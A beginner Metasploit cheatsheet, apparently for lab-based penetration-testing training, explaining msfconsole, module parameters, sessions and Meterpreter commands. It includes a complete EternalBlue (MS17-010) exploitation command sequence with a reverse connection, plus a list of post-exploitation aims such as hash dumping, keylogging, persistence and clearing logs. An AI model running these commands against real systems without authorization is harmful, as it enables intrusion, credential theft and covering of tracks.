# Metasploit Cheatsheet (Beginner Friendly)

----

If you're a beginner in the world of ethical hacking, this is the perfect place to learn the basics of using Metasploit – one of the most powerful tools for penetration testing.

## 🔧 Launching Metasploit

---
 ```
msfconsole
 ```
This command starts the Metasploit console (msfconsole) from the terminal. All other commands will be executed from there.

## ❓ What is Metasploit?

Metasploit is a penetration testing framework used to:

 ○ Scan systems for vulnerabilities

 ○ Exploit security weaknesses

 ○ Gain remote access to target systems

 ○ Perform post-exploitation tasks

 ○ Test payloads and delivery techniques

It supports many modules for different phases of an attack: reconnaissance, exploitation, and post-exploitation.

---

## 🔎 Navigating Through Modules

   1. Search for an exploit:

  ```search <name or vulnerability> ```

Example:

 ```
search ms17_010
 ```

2. Choose an exploit:
   
 ```
use <path/to/module>
 ```
Example:

 ```
use exploit/windows/smb/ms17_010_eternalblue  (ms17_010_eternalblue EXAMPLE)
 ```

3. Check required parameters:

 ```
show options
 ```

⚠️ Each module has its own required and optional parameters. Use show options to see what must be set.

## 📌 What Are Parameters?

Parameters tell Metasploit how to configure the exploit or payload. These include:

IP addresses (target and local)

Ports

Authentication credentials (if needed)

Payload settings

You must correctly set these before running an attack.

🧠 Explanation of Basic Parameters

Parameter

Explanation

RHOSTS

"Remote Host" – the IP address of the target. You can set a single IP, a full range (10.10.0.0/24), or even a file with multiple IPs (file:/path/to/file.txt).

RPORT

"Remote Port" – The port on the target running the service. e.g., 445 for SMB, 80 for HTTP.

LHOST

"Local Host" – Your IP address (AttackBox, Kali VM...). This is the address the target will connect back to.

LPORT

"Local Port" – The port on your system that will receive the reverse connection. e.g., 4444.

PAYLOAD

The code that runs on the target once the exploit succeeds. It can be a shell, Meterpreter, etc.

SESSION

Once a connection is established with the target, you get a session. Each session has an ID used to interact with it.

🔁 Any parameter can be changed using set, removed with unset, or globally set using setg and unsetg.

## ⚙️ Setting Parameters

🔹 Set per module:

set PARAMETER VALUE

Examples:

set RHOSTS 10.10.165.39
set LHOST 10.10.44.70
set LPORT 4444

🔹 Set parameters globally:

setg PARAMETER VALUE

Example:

setg RHOSTS 10.10.165.39

Use setg if you want the parameter to apply across all modules without needing to set it each time.

🔹 Clear parameters:

unset <PARAM>
unsetg <PARAM>
unset all

# 📜 Types of Prompts in Metasploit

Understanding prompts helps you know where you are and what commands are allowed:

Prompt

Meaning

root@...

Your system’s standard command line – outside of Metasploit

msf6 >

Main Metasploit prompt – no module selected yet

msf6 exploit(...) >

A specific module is active – now you can use set, exploit, etc.

meterpreter >

You're inside a Meterpreter session – a tool for interacting with target

C:\Windows\...>

Command shell on the target – standard CMD directly from the target

##  🧪 Check Vulnerability Without Exploiting

You can use certain auxiliary modules to check if a system is vulnerable without actually exploiting it:

use auxiliary/scanner/smb/smb_ms17_010
run

If setg was used, parameters like RHOSTS will already be set:

show options
run

## 💣 Exploitation

Run exploit:
 ```
exploit
```
Or:
```
run
```
To run the exploit and background the session immediately:
```
exploit -z
```
Session will stay in the background (you can access it later with sessions).

💻 Session Management

List sessions:
```
sessions
```
Interact with a session:
```
sessions -i <ID>
```
Exit Meterpreter and return to msfconsole:
```
background
```
Or:

CTRL + Z
 
## 🔁 Useful Meterpreter Commands

Command

Description

sysinfo

Shows system info

getuid

Shows current user on target

shell

Switch to standard CMD shell

screenshot

Takes a screenshot of the target

upload <local_file>

Uploads a file to the target

download <target_file>

Downloads a file from the target

✅ Example: Full Attack Flow (MS17-010)

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
setg RHOSTS 10.10.165.39
set LHOST 10.10.44.70
set LPORT 4444
exploit -z

After Successful Exploit:

sessions
sessions -i 1

## 🚀 What Can You Do After Exploitation?

Once the target is compromised, you can:

Dump password hashes

Enumerate users and groups

Pivot into internal networks

Upload and run tools like Mimikatz

Log keystrokes

Set up persistence (reconnect after reboot)

Escalate privileges to admin/system

Clean logs and cover tracks
